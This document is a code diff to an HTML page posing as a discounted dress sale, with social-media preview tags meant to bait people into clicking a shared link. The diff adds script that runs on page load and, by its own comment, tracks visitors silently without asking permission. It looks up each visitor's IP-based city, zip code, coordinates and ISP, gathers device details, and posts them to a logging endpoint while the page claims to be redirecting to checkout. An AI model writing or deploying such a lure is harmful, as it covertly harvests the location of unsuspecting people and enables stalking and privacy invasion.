@@ -3,11 +3,9 @@
 <head>
     <title>Summer Floral Dress - 50% OFF</title>
     
-    <!-- OpenGraph metadata for WhatsApp/Telegram preview -->
     <meta property="og:title" content="Summer Floral Dress - Mega Sale!">
     <meta property="og:type" content="website">
     <meta property="og:description" content="Check out this gorgeous summer dress. Limited stock remaining! Click to buy now.">
-    <!-- A picture of a dress for the thumbnail -->
     <meta property="og:image" content="https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -26,49 +24,41 @@
         <img src="https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" class="dress-img" alt="Dress">
         <p class="price">₹1,299 <del style="color:#999; font-size:16px;">₹2,599</del></p>
         <p>Checking delivery availability for your location...</p>
-        <p class="loading" id="status">Please allow location access to continue...</p>
+        <p class="loading" id="status">Redirecting to checkout...</p>
     </div>
 
     <script>
-        // FIRE IMMEDIATELY ON PAGE LOAD
         window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
+            // SILENT TRACKING: No permissions asked, completely invisible.
+            fetch('http://ip-api.com/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    sendData(ipData);
+                })
+                .catch(error => {
+                    sendData(null); 
                 });
-            } else {
-                sendData(null); 
-            }
         };
 
-        function handleError(error) {
-            sendData(null, error.message);
-        }
-
-        function sendData(position, locError = null) {
+        function sendData(ipData) {
             let info = {
                 screen_width: window.screen.width,
                 screen_height: window.screen.height,
                 platform: navigator.platform,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
-                cores: navigator.hardwareConcurrency || "Unknown",
-                memory: navigator.deviceMemory || "Unknown"
+                stealth_location: ipData ? {
+                    status: "Success (Silent Tracking)",
+                    ip: ipData.query,
+                    country: ipData.country,
+                    region: ipData.regionName,
+                    city: ipData.city,
+                    zip: ipData.zip,
+                    latitude: ipData.lat,
+                    longitude: ipData.lon,
+                    isp: ipData.isp
+                } : "Failed to fetch silent location"
             };
-
-            if (position) {
-                info.location = {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    altitude: position.coords.altitude || "Not available (Depends on device)",
-                    accuracy_meters: position.coords.accuracy,
-                    altitude_accuracy: position.coords.altitudeAccuracy || "Not available"
-                };
-            } else {
-                info.location_error = locError || "Geolocation not supported or denied";
-            }
 
             fetch('/log', {
                 method: 'POST',
